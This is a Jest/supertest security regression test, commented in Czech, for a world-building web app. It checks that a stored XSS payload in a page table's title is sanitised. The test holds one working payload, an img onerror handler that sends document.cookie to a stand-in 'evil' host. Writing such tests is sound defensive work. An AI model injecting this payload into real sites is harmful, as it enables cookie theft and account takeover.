import request from 'supertest';
import { createTestApp, TestApp } from '../helpers/app-factory';
import { registerUser, authHeader } from '../helpers/auth';
import { clearAllCollections } from '../helpers/db';
import { AuthModule } from '../../src/modules/auth/auth.module';
import { UsersModule } from '../../src/modules/users/users.module';
import { WorldsModule } from '../../src/modules/worlds/worlds.module';
import { PagesModule } from '../../src/modules/pages/pages.module';
import { WorldElevationsModule } from '../../src/modules/world-elevations/world-elevations.module';

/**
 * Skill `pentest` T1 — STORED XSS (styl 36). Katalog PT-36a.
 *
 * Útok: PJ vloží do `table.title` stránky payload `<img onerror=…>`. Sink
 * `PageSidebar.tsx` renderuje title přes `dangerouslySetInnerHTML` → skript se
 * spustí u KAŽDÉHO diváka vč. Admina/PJ = krádež cookie / převzetí účtu.
 * `sanitizeTable` sanitizuje headers+values, ale NE title (PT-36a).
 *
 * Test-first: nejdřív RED (díra), po opravě (title do sanitizeTable) GREEN.
 */
describe('PT-36a · stored XSS v pages table.title', () => {
  let testApp: TestApp;

  beforeAll(async () => {
    testApp = await createTestApp({
      replSet: true,
      modules: [
        AuthModule,
        UsersModule,
        WorldsModule,
        PagesModule,
        WorldElevationsModule,
      ],
    });
  });
  afterAll(async () => testApp.close());
  beforeEach(async () => clearAllCollections(testApp.connection));

  const srv = () => testApp.app.getHttpServer();

  async function createWorld(ownerToken: string): Promise<string> {
    const res = await request(srv())
      .post('/api/worlds')
      .set(authHeader(ownerToken))
      .send({
        name: 'XSS Test World',
        slug: `xss-world-${Date.now()}`,
        genre: 'fantasy',
        system: 'dnd5e',
        accessMode: 'public',
        description: 'Test',
      });
    if (res.status !== 201) {
      throw new Error(`createWorld: ${res.status} ${JSON.stringify(res.body)}`);
    }
    const b = res.body as { id?: string; _id?: string };
    return b.id ?? (b._id as string);
  }

  const XSS = '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">';

  it('table.title s <img onerror> se sanitizuje (žádný onerror v uloženém title)', async () => {
    const owner = await registerUser(testApp.app, {
      username: 'pjxss',
      email: 'pjxss@test.io',
      password: 'Password123!',
    });
    const worldId = await createWorld(owner.accessToken);
    const slug = `xss-page-${Date.now()}`;

    const createRes = await request(srv())
      .post(`/api/worlds/${worldId}/pages`)
      .set(authHeader(owner.accessToken))
      .send({
        slug,
        type: 'Seznam',
        title: 'Legit page title',
        table: { hasTable: true, title: XSS, headers: ['h'], values: ['v'] },
      });

    expect([200, 201]).toContain(createRes.status);

    // Přečti stránku zpět (co uvidí divák).
    const getRes = await request(srv())
      .get(`/api/worlds/${worldId}/pages/${slug}`)
      .set(authHeader(owner.accessToken));
    expect(getRes.status).toBe(200);

    const storedTitle: string =
      (getRes.body?.table?.title as string) ??
      (createRes.body?.table?.title as string) ??
      '';

    // KLÍČOVÁ OBRANA: uložený title NESMÍ nést spustitelný handler.
    expect(storedTitle).not.toContain('onerror');
    expect(storedTitle.toLowerCase()).not.toContain('<script');
    expect(storedTitle).not.toContain('document.cookie');
  });
});
